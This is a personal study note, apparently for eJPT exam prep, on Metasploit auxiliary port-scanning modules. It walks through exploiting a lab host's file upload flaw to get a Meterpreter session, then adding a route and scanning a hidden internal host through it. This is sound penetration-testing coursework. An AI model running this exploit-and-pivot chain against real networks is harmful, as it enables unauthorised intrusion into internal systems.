---
title: Port Scanning with Auxiliary Modules (incl. Pivoting)
tags: [Enumeration, Metasploit, AuxiliaryModules, PortScanning, Pivoting, TCPScan, UDPSweep, Meterpreter, eJPT]
created: 2026-04-04
source: Notion
---

# Port Scanning with Auxiliary Modules (incl. Pivoting)

**Related:** [[Importing-Nmap-into-Metasploit]] | [[Introduction-to-Enumeration]] | [[FTP-Enumeration]] | [[00-INDEX]]

---

## Overview

Metasploit **auxiliary modules** for port scanning — TCP and UDP — and their most powerful use case: **scanning internal networks through a compromised host (pivoting)**.

---

## What is an Auxiliary Module?

Auxiliary modules perform **non-exploitation tasks**:
- Port scanning & host discovery
- Service enumeration (FTP, SSH, SMB, etc.)
- Network fuzzing
- Vulnerability detection

**Key distinction:** Auxiliary modules **cannot be paired with payloads** — they gather information only.

---

## Why Use Auxiliary Modules Instead of Nmap?

For initial recon, Nmap and auxiliary modules are equivalent. The real advantage is in **post-exploitation / pivoting**.

### The Pivoting Scenario

```
Attacker
   │
   └── [External Network] ──► Victim 1 (exploited)
                                   │
                              [Internal Network]
                                   │
                               Victim 2 (hidden, unreachable from outside)
```

You cannot reach Victim 2 from the outside — only through Victim 1. Auxiliary modules can scan through the Meterpreter session on Victim 1.

---

## Part 1 — TCP Port Scan

```bash
service postgresql start
msfconsole
workspace -a portscan

search portscan
use auxiliary/scanner/portscan/tcp
set RHOSTS <target-ip>
set PORTS 1-10000
run
```

---

## Part 2 — Exploit Victim 1 → Get Meterpreter

```bash
search zcoda
use exploit/multi/http/zcoda_file_upload
set RHOSTS <victim1-ip>
set TARGETURI /
exploit
# Opens Meterpreter session

sysinfo
# OS: Linux | Hostname: victim1
```

---

## Part 3 — Discover the Internal Network

```bash
shell
bash -i
ifconfig
# eth0: external IP
# eth1: internal IP — e.g. 10.x.x.2
# Victim 2 is on the same internal subnet: change .2 → .3

exit    # back to Meterpreter
```

---

## Part 4 — Add a Route for Pivoting

```bash
run post/multi/manage/autoroute SUBNET=<internal-subnet-ip>

background     # Background session (keep alive)
sessions       # List all active sessions
```

---

## Part 5 — Port Scan Victim 2 Through the Pivot

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS <victim2-internal-ip>
run

# Results:
# Port 21  — FTP
# Port 22  — SSH
# Port 80  — HTTP
```

> This scan runs **through the Meterpreter session** on Victim 1 — completely invisible from the external network.

---

## Part 6 — UDP Sweep

```bash
search udp_sweep
use auxiliary/scanner/discovery/udp_sweep
set RHOSTS <target-ip>
run
```

---

## Key Auxiliary Modules

| Module | Purpose |
|---|---|
| `auxiliary/scanner/portscan/tcp` | TCP port scan |
| `auxiliary/scanner/portscan/syn` | SYN (stealth) port scan |
| `auxiliary/scanner/discovery/udp_sweep` | UDP service discovery |

---

## Sessions Cheat Sheet

```bash
sessions              # List all active sessions
sessions -i 1         # Interact with session 1
background            # Background current session (keep alive)
```

---

## Key Takeaways

- Auxiliary modules are **critical for post-exploitation pivoting** — their primary advantage over Nmap
- The `autoroute` module tells Metasploit to proxy traffic through the active Meterpreter session
- UDP sweep returns no results if the target has no open UDP services — this is normal
- Next: **enumeration with auxiliary modules** targeting specific services → [[FTP-Enumeration]] | [[SMB-Enumeration]] | [[SSH-Enumeration]]
